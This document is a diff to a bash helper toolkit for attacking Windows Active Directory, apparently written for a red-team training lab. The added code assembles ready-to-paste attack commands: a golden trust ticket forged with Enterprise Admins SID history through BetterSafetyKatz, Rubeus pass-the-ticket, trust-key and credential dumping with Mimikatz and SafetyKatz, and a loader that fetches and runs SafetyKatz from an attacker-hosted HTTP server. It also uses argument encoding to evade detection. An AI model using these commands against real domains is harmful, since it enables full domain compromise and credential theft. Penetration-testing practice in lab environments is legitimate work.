@@ -59,6 +59,58 @@ nb-ad-cmd-ping                 sweep a network subnet with ping requests on wind
 DOC
 }
 
+nb-ad-pwsh-krbtgt-hash() {
+    __check-project
+
+}
+
+nb-ad-pwsh-trust-tickets() {
+    __check-project
+
+    __warn "You must use an elevated command prompt."
+    echo
+
+    __warn "NOTE: The prerequisite of export the trust key between the child and the parent domain is having DA access, you can get it using OPTH:"
+    __ok "nb-ad-pwsh-opth"
+    echo
+
+    __ask "Enter the current Domain name"
+    nb-vars-set-domain
+    __ask "Enter the Parent Domain name"
+    local dom && __askvar dom PARENT_DOMAIN
+    __ask "Enter the Domain SID of the current domain"
+    local sid1 && __askvar sid1 DomainSID
+    __ask "Enter the Domain SID of the parent domain"
+    local sid2 && __askvar sid2 ParentDomainSID
+    __ask "Enter the hostname of parent DC"
+    local hostname && __askvar hostname HOSTNAME
+    __ask "Enter the Administrator's RC4 hash"
+    __check-hash
+
+    echo
+    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __ok "kerberos::golden"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    __COMMAND="C:\\\\AD\\\\Tools\\\\BetterSafetyKatz.exe -args \"%Pwn% /user:Administrator /domain:${__DOMAIN} /sid:${sid1} /sids:${sid2}-519 /rc4:${__HASH} /service:krbtgt /target:$dom /ticket:C:\AD\Tools\trust_tkt.kirbi\" \"exit\""
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command to Forge a ticket with SID History of Enterprise Admins copied to clipboard"
+    __ok "$__COMMAND"
+    echo
+    __warn "Now, encode the following command with: .\\ArgSplit.bat:"
+    __ok "asktgs"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+    echo
+    __info "To use the ticket with Rubeus:"
+    __ok "C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /ticket:C:\\\\AD\\\\Tools\\\\trust_tkt.kirbi /service:cifs/$hostname.$dom /dc:$hostname.$dom /ptt"
+}
+
 nb-ad-pwsh-rbcd() {
     __check-project
     __info "Find a user that has write permission over a computer object (check ObjectDN's first 'CN='):"
@@ -310,6 +362,7 @@ nb-ad-pwsh-dcsync() {
 
 nb-ad-pwsh-opth() {
     __check-project
+    nb-vars-set-domain
     nb-vars-set-user
     __ask "Enter AES256 version of the hash"
     __check-hash
@@ -320,7 +373,7 @@ nb-ad-pwsh-opth() {
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
-    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /domain:dollarcorp.moneycorp.local /user:${__USER} /aes256:${__HASH} /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt"
+    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /domain:dollarcorp.moneycorp.local /user:${__USER} /aes256:${__HASH} /opsec /createnetonly:C:\\\\Windows\\\\System32\\\\cmd.exe /show /ptt"
 
     echo "$__COMMAND" | wl-copy
     echo
@@ -433,8 +486,9 @@ nb-ad-pwsh-enum-domain() {
     __ask "PowerView Domain Enumeration Commands:"
     echo "1. Get current domain"
     echo "2. Get Domain SID for the current domain"
-    echo "3. Get information of the Domain Controller"
-    echo "4. Return to previous menu"
+    echo "3. Get Domain SID for the foreign domain"
+    echo "4. Get information of the Domain Controller"
+    echo "5. Return to previous menu"
     echo
     echo -n "Choose a command to copy: "
     read choice
@@ -442,8 +496,13 @@ nb-ad-pwsh-enum-domain() {
     case $choice in
         1) __COMMAND="Get-NetDomain";;
         2) __COMMAND="Get-DomainSID";;
-        3) __COMMAND="Get-NetDomainController";;
-        4) return;;
+        3) 
+          echo
+          nb-vars-set-domain
+          __COMMAND="Get-DomainSID -Domain ${__DOMAIN}"
+          ;;
+        4) __COMMAND="Get-NetDomainController";;
+        5) return;;
         *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-domain; return;;
     esac
 
@@ -465,8 +524,9 @@ nb-ad-pwsh-dump-secrets() {
     __ok "nb-pwsh-file-download    - Execute in memory"
 
     echo
-    __warn "If you're using SafetyKatz.exe, you need to encode the command with: .\\ArgSplit.bat:"
+    __warn "If you're using SafetyKatz.exe, you need to encode the command with: .\\ArgSplit.bat for example:"
     __ok "sekurlsa::ekeys"
+    __ok "lsadump::trust"
     echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
@@ -476,6 +536,7 @@ nb-ad-pwsh-dump-secrets() {
     echo "1. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
     echo "2. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
     echo "3. C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\""
+    echo "4. C:\\\\AD\\\\Tools\\\\Loader.exe -Path http://${__LHOST}:${__LPORT}/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
     echo
     echo -n "Choice: "
     read choice
@@ -483,8 +544,13 @@ nb-ad-pwsh-dump-secrets() {
     case $choice in
         1) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::ekeys\"'";;
         2) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
-        2) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
-        3) exit;;
+        3) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
+        4) 
+          nb-vars-set-lhost
+          nb-vars-set-lport
+          __COMMAND=".\\\\Loader.exe -Path http://${__LHOST}:${__LPORT}/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
+          ;;
+        5) exit;;
         *) echo "Invalid option"; exit;;
     esac
 
@@ -501,6 +567,7 @@ nb-ad-pwsh-file-download() {
     nb-vars-set-lport
     local filename && __askvar filename "FILENAME"
 
+    echo
     __ask "Do you want to download the file to disk or download and execute it in memory? (d/e)"
     local down && __askvar down "DOWNLOAD_OPTION"
 
